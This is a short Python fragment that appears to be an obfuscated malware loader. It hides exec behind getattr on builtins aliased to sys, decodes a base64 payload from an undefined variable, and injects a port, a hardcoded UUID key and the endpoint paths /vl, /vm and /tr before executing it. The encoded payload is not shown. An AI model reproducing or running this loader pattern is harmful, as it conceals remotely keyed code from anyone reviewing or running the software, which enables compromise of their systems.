import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "b2f8ba59-910e-467e-bc97-c1832cebb52f")
    .replace("__vl__", "/vl")
    .replace("__vm__", "/vm")
    .replace("__tr__", "/tr")
)